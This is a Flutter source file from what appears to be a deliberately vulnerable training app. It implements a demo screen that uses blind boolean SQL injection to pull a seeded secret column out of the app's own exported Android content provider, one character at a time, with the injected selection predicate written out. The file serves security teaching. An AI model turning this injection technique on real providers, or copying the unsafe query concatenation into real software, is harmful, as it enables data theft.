import 'package:flutter/material.dart';

import '../../../core/evidence_sink.dart';
import '../../../core/native/provider_ipc_bridge.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import 'blind_sqli_oracle.dart';

/// Blind SQLi Boolean-Oracle Extraction (Contacts-Provider class).
///
/// Reproduces CVE-2026-28576: a smuggled sub-query in the selection clause turns
/// a provider into a boolean oracle that leaks a protected column one char at a
/// time, with no direct read and no permission grant. On Android the oracle
/// drives DVMA's real exported provider over the seeded SQLite `secret` column.
class ContactsProviderBlindSqliOracleScreen extends StatefulWidget {
  const ContactsProviderBlindSqliOracleScreen({super.key});

  static const String vulnId = 'contacts_provider_blind_sqli_oracle';

  @override
  State<ContactsProviderBlindSqliOracleScreen> createState() =>
      _ContactsProviderBlindSqliOracleScreenState();
}

class _ContactsProviderBlindSqliOracleScreenState
    extends State<ContactsProviderBlindSqliOracleScreen> {
  String? _result;
  bool _running = false;

  /// Boolean oracle over the real exported provider: the injected predicate is
  /// smuggled into `SELECT id, name FROM users WHERE <selection>`, scoped to the
  /// admin row, so a returned row means the predicate is true. The provider's
  /// SQLite db holds the real `secret` column, never read directly here.
  static Future<bool>? _realOracle(String predicate) {
    final selection = "name='admin' AND $predicate";
    return ProviderIpcBridge.sqlInject(selection).then((rows) {
      if (rows == null) return false;
      return rows.trim().isNotEmpty && !rows.contains('SQL error');
    });
  }

  Future<void> _run() async {
    if (_running) return;
    setState(() => _running = true);
    // Probe the real provider once; if it answers, extract against it, else
    // fall back to the offline engine (iOS / desktop / flutter test).
    final probe = await ProviderIpcBridge.sqlInject("name='admin'");
    final onDevice = probe != null;
    final oracle = BlindSqliOracle(
      rowExists: onDevice ? (s) => _realOracle(s)! : null,
    );
    final recovered = await oracle.extract();
    if (!mounted) return;
    setState(() {
      _running = false;
      _result =
          'recovered secret: $recovered\n'
          'oracle requests used: ${oracle.probes}\n'
          'source: ${onDevice ? "REAL exported provider (SQLite secret column)" : "offline engine"}\n'
          '(never read the column directly - extracted bit by bit)';
    });
    DvmaEvidence.record(
      ContactsProviderBlindSqliOracleScreen.vulnId,
      'blind-sqli-oracle',
      'recovered a protected column with no direct read and no permission '
          'grant via ${oracle.probes} boolean-oracle requests against '
          '${onDevice ? "the real exported provider" : "the offline engine"}: '
          '$recovered',
    );
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: ContactsProviderBlindSqliOracleScreen.vulnId,
      title: 'Blind SQLi Boolean-Oracle Extraction',
      difficulty: DvmaDifficulty.hard,
      explanation:
          'A provider concatenates the caller-supplied selection into SQL on a '
          'legacy path with no strict-SQL hardening, so a balanced sub-query '
          '(substr(secret,i,1)=\'c\') is evaluated as a WHERE predicate. The '
          'query returns a row or none, giving a boolean oracle: a '
          'permission-less caller recovers the protected column one character '
          'at a time, never reading it directly. On Android this drives the '
          'REAL exported provider (content://com.dvma.provider.vuln/users) over '
          'its seeded SQLite secret column - the same surface adb/drozer hit; '
          'offline an engine mirrors it. Reproduces CVE-2026-28576.',
      children: [
        DemoActionButton(
          label: _running ? 'Extracting…' : 'Run blind extraction',
          onPressed: _run,
        ),
        if (_result != null)
          EvidencePanel(label: 'oracle extraction', value: _result!),
      ],
    );
  }
}
